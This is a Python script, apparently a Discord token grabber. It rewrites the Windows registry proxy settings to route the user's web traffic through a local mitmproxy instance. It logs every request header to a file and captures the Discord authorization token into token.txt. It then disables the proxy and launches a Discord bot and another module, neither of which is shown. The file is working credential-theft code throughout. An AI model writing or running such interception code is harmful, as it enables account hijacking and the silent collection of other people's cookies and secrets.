import threading
import time
import asyncio
import os
import logging
import DiscordManager
import LaunchingUkrainizaciya
# ---------------------ProxySetup---------------------
import winreg as reg

# ----------------------------------------------------
# ---------------------tokengraber---------------------
import time

from mitmproxy import options
from mitmproxy.tools.dump import DumpMaster
import asyncio
import logging
from mitmproxy.addonmanager import Loader

# -----------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("requests.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# ---------------------ProxySetup---------------------
class ProxySetup:
    def __init__(self):
        ...

    @classmethod
    def set_proxy(cls, proxy) -> None:
        internet_settings = reg.OpenKey(reg.HKEY_CURRENT_USER,
                                        r'Software\Microsoft\Windows\CurrentVersion\Internet Settings',
                                        0, reg.KEY_ALL_ACCESS)

        reg.SetValueEx(internet_settings, 'ProxyServer', 0, reg.REG_SZ, proxy)
        reg.SetValueEx(internet_settings, 'ProxyEnable', 0, reg.REG_DWORD, 1)

        reg.CloseKey(internet_settings)

    @classmethod
    def deactivate_proxy(cls) -> None:
        internet_settings = reg.OpenKey(reg.HKEY_CURRENT_USER,
                                        r'Software\Microsoft\Windows\CurrentVersion\Internet Settings',
                                        0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(internet_settings, 'ProxyEnable', 0, reg.REG_DWORD, 0)

        reg.CloseKey(internet_settings)


# --------------------------------------------------------

# ---------------------tokengraber---------------------

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("requests.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
finished = False


class RequestLogger:
    def load(self, loader: Loader):
        loader.add_option(
            name="listen_host", typespec=str, default="127.0.0.1",
            help="Proxy listen address"
        )
        loader.add_option(
            name="listen_port", typespec=int, default=8080,
            help="Proxy listen port"
        )

    def request(self, flow):
        global finished
        request = flow.request
        for header, value in request.headers.items():
            if header == "authorization" and "discord.com" in request.url:
                logger.info("---------------------------------------")
                logger.info(f"DETECTED TOKEN DISCORD: {value}")
                logger.info("---------------------------------------")
                with open("token.txt", "w") as file:
                    file.write(value)
                finished = True
            else:
                logger.info(f"URL: {flow.request.url}")
                logger.info("Request Headers:")
                for key, value in flow.request.headers.items():
                    logger.info(f"{key}: {value}")
                logger.info("\n")


class tokengraber:
    @classmethod
    async def start(cls):
        global finished
        opts = options.Options(listen_host='127.0.0.1', listen_port=8080)
        pconf = opts.keys()
        m = DumpMaster(opts)

        m.addons.add(RequestLogger())

        try:
            asyncio.create_task(m.run())
            while finished == False:
                await asyncio.sleep(1)
            logger.info("Closing TokenGraber Proxy")
            m.shutdown()


        except SystemExit:
            ...


# --------------------------------------------------------

# ---------------------StartPoint-------------------------

async def main():
    logger.info("Proxy installation.")

    proxy = "http=localhost:8080;https=localhost:8080"
    ProxySetup.set_proxy(proxy)

    logger.info("The proxy is installed and the settings are saved.")

    await tokengraber.start()

    while os.path.exists("token.txt") == False:
        time.sleep(1)

    logger.info("Deactivating a proxy.")
    ProxySetup.deactivate_proxy()

    logger.info("Starting Discord Bot")


if __name__ == "__main__":
    asyncio.run(main())
    logger.info("Build Thread")
    thread = threading.Thread(target=LaunchingUkrainizaciya.start)
    logger.info("Starting Thread")
    thread.start()
    DiscordManager.Start()
